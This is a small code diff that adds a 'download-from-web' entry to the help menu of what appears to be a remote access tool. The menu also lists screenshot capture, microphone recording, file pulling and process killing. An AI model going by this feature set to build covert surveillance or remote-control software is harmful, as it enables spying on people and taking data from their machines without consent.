@@ -198,6 +198,7 @@ def help_command():
     {g}screenshot <interval> <quantity>{r} : Takes and saves screenshots every interval seconds for quantity times.
     {g}audio-record <seconds>{r} : Records an audio recording for the specified length and saves it in uploads.
     {g}downloader <path> <filename>{r} : Downloads the file at the given path to the uploads folder as the given filename.
+    {g}download-from-web <url> <filename> <dest dir> : Downloads a file from url as filename to given path (path optional).
     {g}get-processes <process name>{r} : Finds and prints all processes or all processes by given name (optional).
     {g}kill <pid>{r} : Kills the process with associated pid.
     {g}kill-by-name <process name>{r} : Kills all processes with the given name (Not case sensitive).
